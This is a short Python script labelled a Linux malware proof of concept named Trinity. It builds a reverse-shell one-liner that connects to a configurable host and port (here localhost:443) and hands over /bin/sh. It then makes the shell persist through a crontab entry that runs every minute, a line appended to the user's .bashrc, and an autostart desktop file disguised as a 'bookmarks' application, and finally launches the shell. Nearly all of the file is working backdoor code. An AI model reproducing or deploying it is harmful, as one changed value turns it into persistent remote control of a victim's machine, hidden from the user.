#!/usr/bin/python
# Trinity - Basic Python Linux Malware PoC
# Made by Optixal

import socket, subprocess, os
from os.path import expanduser

RHOST = "127.0.0.1"
RPORT = 443
payload = "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"" + RHOST + "\"," + str(RPORT) + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\"/bin/sh\");'"

payload_desktop = payload.replace('\"', '\\\"')

user_home = expanduser('~')

def infect_crontab():
    crontab = open('.cron', 'w')
    crontab.write("* * * * * " + payload + "\n")
    crontab.close()
    os.system("crontab < .cron")
    os.remove('.cron')

def infect_bashrc():
    bashrc = open(user_home + '/.bashrc', 'a')
    bashrc.write(payload + " &\n")
    bashrc.close()

def infect_autostart():
    desktop_entry = "[Desktop Entry]\n"
    desktop_entry += "Type=Application\n"
    desktop_entry += "Name=bookmarks\n"
    desktop_entry += "Comment=bookmark bar\n"
    desktop_entry += "Exec=sh -c \"" + payload_desktop + "\"\n"
    entry_file = open(user_home + '/.config/autostart/bookmark.desktop', 'w')
    entry_file.write(desktop_entry)
    entry_file.close()

def main():
    infect_crontab()
    infect_bashrc()
    infect_autostart()
    os.system(payload + " &")

main()